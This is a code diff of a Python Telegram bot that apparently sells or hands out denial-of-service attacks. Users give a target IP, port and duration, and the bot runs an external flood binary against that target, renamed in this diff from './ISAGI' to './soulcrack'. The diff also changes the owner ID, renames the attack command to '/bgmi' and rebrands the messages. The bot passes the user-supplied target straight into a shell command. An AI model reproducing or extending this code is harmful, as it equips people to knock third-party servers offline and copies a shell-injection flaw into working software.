@@ -142,7 +142,7 @@ def remove_user(message):
 # /reset_TF Command
 @bot.message_handler(commands=['reset_TF'])
 def reset_attack_limit(message):
-    owner_id = 7209762563
+    owner_id = 6353114118
     if message.from_user.id != owner_id:
         response = (
             "❌🚫 *ACCESS DENIED!* 🚫❌\n\n"
@@ -348,7 +348,7 @@ def TF_command(message):
         logging.info(f"Received arguments: {args}")
 
         if len(args) != 3:
-            raise ValueError("@SLAYER_OP7 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ USE THIS 👇⬇️\n/Moin <IP> <PORT> <DURATION>")
+            raise ValueError("@SLAYER_OP7 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ USE THIS 👇⬇️\n/bgmi <IP> <PORT> <DURATION>")
 
         target_ip, target_port, user_duration = args
 
@@ -372,7 +372,7 @@ def TF_command(message):
             message.chat.id,
             f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n⚠️𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔⚠️ :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
         )
-        logging.info(f"Attack started by @{username}: ./Moin {target_ip} {target_port} {default_duration} 900")
+        logging.info(f"Attack started by @{username}: ./soulcrack {target_ip} {target_port} {default_duration}")
         
         active_attacks += 1
         asyncio.create_task(run_attack_command_async(message.chat.id, target_ip, int(target_port), default_duration, user_duration, username))
@@ -383,12 +383,12 @@ def TF_command(message):
 async def run_attack_command_async(chat_id, target_ip, target_port, duration, user_duration, username):
     global active_attacks
     try:
-        command = f"./ISAGI {target_ip} {target_port} {duration} 900"
+        command = f"./soulcrack {target_ip} {target_port} {duration}"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(
             chat_id,
-            f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 PRAKHAR-VARDHAN™"
+            f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 ISAGI-TEAM™"
         )
     except Exception as e:
         bot.send_message(chat_id, f"Error running attack command: {e}")
